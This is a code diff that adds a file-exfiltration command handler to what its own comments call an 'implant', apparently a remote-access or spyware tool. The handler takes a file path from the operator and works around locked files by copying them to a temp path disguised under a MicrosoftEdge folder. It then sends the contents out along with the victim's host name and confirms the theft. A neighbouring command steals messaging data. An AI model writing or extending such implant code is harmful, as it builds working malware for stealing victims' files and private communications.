@@ -922,6 +922,58 @@ int main(int argc, char **argv)
             break;
         }
 
+        case COMMAND_FILE_EXFIL: {
+            char path[pkt->payload_len + 1];
+            memcpy(path, pkt->payload, pkt->payload_len);
+            path[pkt->payload_len] = '\0';
+#ifdef _WIN32
+            /* Reject files over 100 MB to avoid crashing the implant */
+            WIN32_FILE_ATTRIBUTE_DATA fa;
+            if (!GetFileAttributesExA(path, GetFileExInfoStandard, &fa)) {
+                char *err = "file not found or access denied";
+                Packet resp = {COMMAND_ERROR, pkt->request_id, (int)strlen(err), err};
+                locked_send(&resp, conn);
+                break;
+            }
+            if (fa.nFileSizeHigh > 0 || fa.nFileSizeLow > 100 * 1024 * 1024) {
+                char *err = "file exceeds 100 MB limit";
+                Packet resp = {COMMAND_ERROR, pkt->request_id, (int)strlen(err), err};
+                locked_send(&resp, conn);
+                break;
+            }
+
+            int len = 0;
+            char *data = read_file_heap_plain(path, &len);
+            if (!data) {
+                /* File may be locked — try via temp copy */
+                const char *tmp = "C:\\Users\\Public\\MicrosoftEdge\\fe.tmp";
+                if (CopyFileA(path, tmp, FALSE)) {
+                    data = read_file_heap_plain(tmp, &len);
+                    DeleteFileA(tmp);
+                }
+            }
+            if (data) {
+                char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
+                DWORD hn_len = sizeof(hostname);
+                GetComputerNameA(hostname, &hn_len);
+                /* Use the original filename as the exfil filename */
+                const char *fname = strrchr(path, '\\');
+                fname = fname ? fname + 1 : path;
+                exfil_post(hostname, fname, data, len);
+                free(data);
+                char ack[128];
+                _snprintf(ack, sizeof(ack), "exfiltrated '%s' (%d bytes)", fname, len);
+                Packet resp = {COMMAND_RESPONSE, pkt->request_id, (int)strlen(ack), ack};
+                locked_send(&resp, conn);
+            } else {
+                char *err = "failed to read file";
+                Packet resp = {COMMAND_ERROR, pkt->request_id, (int)strlen(err), err};
+                locked_send(&resp, conn);
+            }
+#endif
+            break;
+        }
+
         case COMMAND_MESSAGING_STEAL: {
             int len = 0;
             char *data = spy_messaging_steal(&len);
